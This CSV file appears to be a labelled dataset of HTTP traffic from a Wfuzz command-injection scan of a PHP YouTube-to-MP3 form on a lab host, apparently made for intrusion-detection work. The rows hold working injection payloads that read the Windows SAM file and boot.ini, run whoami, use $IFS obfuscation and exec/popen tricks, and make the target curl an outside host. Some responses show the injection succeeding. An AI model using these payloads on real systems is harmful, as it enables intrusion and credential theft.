attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,,*/*,,,192.168.1.34,curl/7.82.0,GET,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:02 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61346
cmdinj,192.168.1.34,80,ytlink=&&type C:\\boot.ini&send=send,*/*,36,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61348
cmdinj,192.168.1.34,80,ytlink=&& type C:\Windows\repair\SAM&send=send,*/*,46,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:13 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61349
cmdinj,192.168.1.34,80,ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send,*/*,45,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,333,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61350
cmdinj,192.168.1.34,80,ytlink=%22%7C%7Cecho%20HUGKZQ$((0%2B67))$(echo%20HUGKZQ)HUGKZQ\&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61351
cmdinj,192.168.1.34,80,ytlink=`ping 127.0.0.1`&send=send,*/*,33,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61352
cmdinj,192.168.1.34,80,ytlink=\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n&send=send,*/*,98,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:18 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61353
cmdinj,52.85.49.22,80,,*/*,,,crowdshield.com,curl/7.81.0,GET,http://crowdshield.com/.testing/rce.txt,<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> ,keep-alive,167,text/html,"Sat, 04 Feb 2023 15:56:12 GMT",301,CloudFront,192.168.1.34,42698
cmdinj,192.168.1.34,80,ytlink=%20echo%20FPVLKT$((63%2B87))$(echo%20FPVLKT)FPVLKT%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61359
cmdinj,192.168.1.34,80,ytlink=%26%26echo%20FFQWQY$((35%2B58))$(echo%20FFQWQY)FFQWQY%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61361
cmdinj,192.168.1.34,80,"ytlink="" && whoami&send=send",*/*,28,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61366
cmdinj,192.168.1.34,80,ytlink='&&echo%20TWKYHE$((0%2B57))$(echo%20TWKYHE)TWKYHE|&send=send,*/*,67,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61367
cmdinj,192.168.1.34,80,"ytlink=""%26%26echo%20IJQIDW$((5%2B53))$(echo%20IJQIDW)IJQIDW&send=send",*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61369
cmdinj,192.168.1.34,80,"ytlink=""%20echo%20TZKEKG$((48%2B96))$(echo%20TZKEKG)TZKEKG%7C&send=send",*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61370
cmdinj,192.168.1.34,80,ytlink=|echo%20CAUDBF$((21%2B9))$(echo%20CAUDBF)CAUDBF\&send=send,*/*,65,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"CAUDBF30CAUDBFCAUDBF\   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,301,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61371
cmdinj,192.168.1.34,80,ytlink=||echo%20UWJWIH$((97%2B96))$(echo%20UWJWIH)UWJWIH%7C&send=send,*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61372
cmdinj,192.168.1.34,80,ytlink=%7C%7Cecho%20QBEEHF$((22%2B49))$(echo%20QBEEHF)QBEEHF|&send=send,*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61373
cmdinj,192.168.1.34,80,ytlink=%26echo%20LPHFGP$((58%2B11))$(echo%20LPHFGP)LPHFGP%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61374
cmdinj,192.168.1.34,80,ytlink=%27echo%20RGSQNO$((48%2B30))$(echo%20RGSQNO)RGSQNO%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61375
cmdinj,192.168.1.34,80,ytlink=%27%0aecho%20UDKFRM$((88%2B90))$(echo%20UDKFRM)UDKFRM%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61376
cmdinj,192.168.1.34,80,ytlink=%22||echo%20WMJGBT$((73%2B39))$(echo%20WMJGBT)WMJGBT%5C%5C&send=send,*/*,75,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61377
cmdinj,192.168.1.34,80,ytlink=%20echo%20THCQQN$((0%2B88))$(echo%20THCQQN)THCQQN%5C%5C&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61378
cmdinj,192.168.1.34,80,ytlink=&echo%20QSELIT$((42%2B46))$(echo%20QSELIT)QSELIT&&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61379
cmdinj,192.168.1.34,80,ytlink=%3Becho%20OKHPYH$((66%2B11))$(echo%20OKHPYH)OKHPYH%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61380
cmdinj,192.168.1.34,80,ytlink=%7Cecho%20VZDOKD$((12%2B24))$(echo%20VZDOKD)VZDOKD%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61382
cmdinj,192.168.1.34,80,ytlink=;echo$IFSORHOEA$((71%2B59))$(echo$IFSORHOEA)ORHOEA%26&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61383
cmdinj,192.168.1.34,80,"ytlink='%20echo%20DHXKNT$((83%2B17))$(echo%20DHXKNT)DHXKNT""&send=send",*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61384
cmdinj,192.168.1.34,80,ytlink='echo$IFSQUCSSY$((71%2B59))$(echo$IFSQUCSSY)QUCSSY%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61385
cmdinj,192.168.1.34,80,"ytlink=""echo$IFSGOPZNT$((61%2B76))$(echo$IFSGOPZNT)GOPZNT&&send=send",*/*,68,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61386
cmdinj,192.168.1.34,80,ytlink=echo$IFSSWOEAI$((89%2B70))$(echo$IFSSWOEAI)SWOEAI&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61387
cmdinj,192.168.1.34,80,ytlink=|echo$IFSMNCLPS$((56%2B63))$(echo$IFSMNCLPS)MNCLPS%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61388
cmdinj,192.168.1.34,80,"ytlink=%26%26echo$IFSAHYRFK$((59%2B15))$(echo$IFSAHYRFK)AHYRFK""&send=send",*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61389
cmdinj,192.168.1.34,80,ytlink=%7Cecho$IFSGUAVSF$((73%2B82))$(echo$IFSGUAVSF)GUAVSF%27&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:44 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61390
cmdinj,192.168.1.34,80,ytlink=%27%20echo%20NPYOVU$((6%2B61))$(echo%20NPYOVU)NPYOVU\&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:44 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61391
cmdinj,192.168.1.34,80,ytlink=%27||echo$IFSJIUIDF$((89%2B41))$(echo$IFSJIUIDF)JIUIDF%2F%2F&send=send,*/*,77,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61392
cmdinj,192.168.1.34,80,ytlink=%22||echo$IFSBZQTDK$((6%2B37))$(echo$IFSBZQTDK)BZQTDK//&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61393
cmdinj,192.168.1.34,80,ytlink=%22&echo$IFSGVEIAO$((60%2B74))$(echo$IFSGVEIAO)GVEIAO%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61394
cmdinj,192.168.1.34,80,ytlink=;echo$IFSOZHGXS$((54%2B58))$(echo$IFSOZHGXS)OZHGXS\&send=send,*/*,68,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:45 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61395
cmdinj,192.168.1.34,80,ytlink=%7Cecho$IFSRIYZJH$((86%2B76))$(echo$IFSRIYZJH)RIYZJH%7C&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61397
cmdinj,192.168.1.34,80,ytlink=||echo$IFSDAJJOA$((63%2B6))$(echo$IFSDAJJOA)DAJJOA//&send=send,*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61398
cmdinj,192.168.1.34,80,ytlink=%7C%7Cecho$IFSEXCORO$((79%2B26))$(echo$IFSEXCORO)EXCORO%7C&send=send,*/*,75,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:46 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61399
cmdinj,192.168.1.34,80,"ytlink="")print(`echo%20SPTGKB`.`echo%20$((57%2B66))`.`echo%20SPTGKB`.`echo%20SPTGKB`)%29%7DSPTGKB&send=send",*/*,107,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61400
cmdinj,192.168.1.34,80,ytlink=');}print(`echo%20MMQDEE\necho%20$((77%2B28))\necho%20MMQDEE\necho%20MMQDEE`)%3B%25252523MMQDEE&send=send,*/*,112,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61401
cmdinj,192.168.1.34,80,ytlink=${exec(print(`echo%20BDBPSZ;echo%20$((87%2B50));echo%20BDBPSZ;echo%20BDBPSZ`)%3BBDBPSZ&send=send,*/*,103,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:47 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61402
cmdinj,192.168.1.34,80,ytlink=${popen(print(`echo%20XZRRJD`.`echo%20$((95%2B86))`.`echo%20XZRRJD`.`echo%20XZRRJD`)%3B.%27XZRRJD&send=send,*/*,114,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61403
